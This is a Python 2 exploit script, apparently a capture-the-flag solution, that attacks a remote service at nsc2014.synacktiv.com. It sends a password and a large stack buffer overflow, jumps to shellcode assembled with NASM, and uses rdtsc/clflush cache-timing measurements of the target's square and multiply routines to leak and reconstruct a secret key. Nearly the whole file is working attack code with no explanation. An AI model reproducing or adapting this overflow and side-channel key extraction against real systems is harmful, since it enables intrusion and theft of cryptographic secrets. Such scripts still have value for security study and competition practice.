#!/usr/bin/python2
import struct
import socket
import time
import os
from tempfile import NamedTemporaryFile
import sys

SOCKET_2014=4
SOCKET_1337=2

jmp_rsp=0x00400f61


def ASM_assembler(shellcode):
	print "############################# shellcode #############################"
	print shellcode
	print "#####################################################################"
	print "\n\n"

	# call NASM
	shellcode="BITS 64\n"+shellcode
	f=open("/tmp/shellcode.s","w")
	asm = NamedTemporaryFile(delete=False)
	asm.write(shellcode)
	asm.close()
	binfile = NamedTemporaryFile(delete=False)
	os.popen("nasm -f bin "+asm.name+" -o "+binfile.name)
	binshellcode=binfile.read()
	binfile.close()
	os.unlink(asm.name)
	os.unlink(binfile.name)
	if "\x0A" in binshellcode:
		print '\\n in shellcode'
		sys.exit(0)
	return binshellcode


def do_measurements(save_result_offset,number_of_measurement,descryptor):
	save_result_offset=hex(save_result_offset)
	number_of_measurement=hex(number_of_measurement)
	descryptor = hex(descryptor)

# sqare : -0x3b0
# multiply : -0x640
	fn_name=os.urandom(4).encode("hex")
	return '''; ----------- do_measurement -----------
mesure:
	mfence
	lfence
	rdtsc
	lfence
	mov r11, rax
	mov rsi,[r12+0x3064]
	lfence
	rdtsc
	clflush [r12+0x3064]
	sub rax, r11

	mov r11, rax
	sub r11, 200
	test r11,r11
	jns mesure2

save_data:
	mov r9, 2
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

mesure2:
	mfence
	lfence
	rdtsc
	lfence
	mov r11, rax
	mov rsi,[r12+0x32E4]
	lfence
	rdtsc
	clflush [r12+0x32E4]
	sub rax, r11

	mov r11, rax
	sub r11, 200
	test r11,r11
	jns save_null_data

save_data2:
	mov r9, 1
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

save_null_data:
	mov r9, 0
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

next:
	mov rbx, 0x2000
	loop:
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		dec rbx
		jnz loop

	add r10,1
	cmp r10,'''+number_of_measurement+'''
	jnz mesure


mov r9, rcx
cmp r9, 0
jz exit

; delimiter
mov rsi, 0xd2f5d20000F5D2F5
xor rsi, 0xFFFFFFFFFFFFFFFF
mov [rsp+0x10], rsi

xor r10, r10
mov r8, '''+save_result_offset+'''
print:
	; print value
	mov rax, 1                       ; syscall write
	mov rdi, '''+descryptor+'''      ; fd
	mov rdx, r9                      ; len
	mov rsi, rsp                     ; addr to print
	add rsi, r8                      ; addr to print
	syscall
exit:
'''

# syscall exit(0)
def exit():
	return '''; ----------- exit -----------
mov rax, 60
mov rdi, 0
syscall

'''

def prepare_measurement(save_result_offset):
	save_result_offset=hex(save_result_offset)
	return '''; ----------- prepare_measurement -----------
xor r12,r12
xor r8,r8
xor r9,r9
xor r10,r10
xor rcx,rcx
mov r12, [0x000000601c98]    ; SEC_fgetc@got.plt
sub r12, 0x35f0
mov r8, '''+save_result_offset+'''
'''

# syscall write(descryptor, [stack_offset], size)
def write_from_stack(descryptor,src,length):
	descryptor=hex(descryptor)
	src=hex(src)
	length=hex(length)
	return '''; ----------- write_from_stack -----------
mov rax, 1
mov rdi, '''+descryptor+'''
mov rsi, rsp
add rsi, '''+src+'''
mov rdx, '''+length+'''
syscall

'''

# write data on [offset]
def save_data_on_stack(offset,data):
	data=data+"\x00"
	minishellcode="; ----------- save_data_on_stack ----------- \n"
	for i in range(0,len(data),8):
		dst_hex=hex(offset)
		xor=0xff
		if "\x0a" in data[i:i+8]:
			newdata=""
			for char in data[i:i+8]:
				newdata+=chr(ord(char)^xor)
			if "\x0a" in newdata:
				print "Bad XOR value, 0x0a present"
				sys.exit(0)
			out=dataHex(newdata)[0]
			minishellcode+='mov rsi, '+hex(out).replace("L","")+"\n"
			minishellcode+='xor rsi, 0xFFFFFFFFFFFFFFFF\n'
			minishellcode+='mov [rsp+'+dst_hex+'], rsi\n'
		else:
			out=dataHex(data[i:i+8])[0]
			minishellcode+='mov rsi, '+hex(out).replace("L","")+"\n"
			minishellcode+='mov [rsp+'+dst_hex+'], rsi\n'
		offset+=8
	return minishellcode+"\n"


def rebase_stack(offset):
	offset=hex(offset)
	return '''; ----------- rebase_stack ----------- 
add rsp, '''+offset+'''

'''

# convert integer to QWORD
def addr(code_addr):
	return struct.pack("<Q",code_addr)

# convert QWORD to integer
def read_remote_value(data):
	return struct.unpack("<B",data)

# convert binary data to QWORD
def dataHex(data):
	if len(data) < 8:
		data=data+"\x00"*(8-len(data))
	return struct.unpack("<Q",data)

# build shellcode
def shellcode():
	enckey = "0C849AFE0A7C11B2F083C32E7FDB0F8AC03198D84D9990B26D6443B1D185A36A235A561BB99FE897858371311B2AD6DFE75E199667637EDEA7B9C14A158A5F6FFE15A1C14DAD808FDC9F846530EDD4FE3E86F4F98571CD45F11190ED531FC940D62C2C2E05F99772235808097763157F140FE4A57DB6AD902D9962F12BDFC1547CED3E282604255B2A5331373CAEE557CC825DD6A03C3D2D7B106E4AD15347BCB5067BDC60376FF1CC133F2C14"

	# ----- construct shellcode -----
	shellcode=rebase_stack(-0x700000)
	

	# string="1\n" # list keys
	string="3\n2\n0\n"+enckey+"\n" # send encrypted key
	shellcode+=save_data_on_stack(0x200,string)
	shellcode+=prepare_measurement(0x600)
	shellcode+=write_from_stack(SOCKET_2014,0x200,len(string))

	shellcode+=do_measurements(0x600,25000,SOCKET_1337)

	string="\nOKOK\n" # marker
	shellcode+=save_data_on_stack(0x400,string)
	shellcode+=write_from_stack(SOCKET_1337,0x400,len(string))

	# -- then exit 
	shellcode+=exit()
	return ASM_assembler(shellcode)


password="UBNtYTbYKWBeo12cHr33GHREdZYyOHMZ"

payload=""
# password
payload+=password+"\n"

# overflow
payload+="A"*12072
# Jump to shellcode
payload+=addr(jmp_rsp)
# write shellcode
payload+=shellcode()
payload+="\n"

s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
s.connect(('nsc2014.synacktiv.com', 1337))
s.send(payload)


# read data on socket
data=""
while True:
	read = s.recv(1024)
	if len(read) == 0:
		break
	data+=read	

if "\nOKOK\n" not in data:
	print repr(data)
	print "\033[31;1mERREUR\033[0m"
	sys.exit(0)
readed = data.split("\n-\n")
data=data.replace('\nOKOK\n','')
data=data.replace('error while receiving key\n','')


block_size=10

current_block_size=0
last_block_size=0
last_result=""
key=""

for val in data:
	val_conv=read_remote_value(val)[0]
	if val_conv == 0:
		continue
	if val_conv != last_result:
		percent=int((last_block_size*1.0/block_size)*100)
		count=int(round(percent*1.0/100,0))
		if last_result == 1:
			if last_block_size > 1:
				print "HIT SQUARE("+str(last_block_size)+") \t=> "+str(percent)+"\t => "+str(count)
				key+="S"*count
		elif last_result == 2:
			if last_block_size > 1:
				print "HIT MULTIPLY("+str(last_block_size)+") \t=> "+str(percent)+"\t => "+str(count)
				key+="M"*count
		current_block_size=0
		last_result=val_conv
	last_block_size=current_block_size
	current_block_size+=1

print key
key=key.replace("SM","1").replace("S","0").replace("M","1")
print key
print len(key)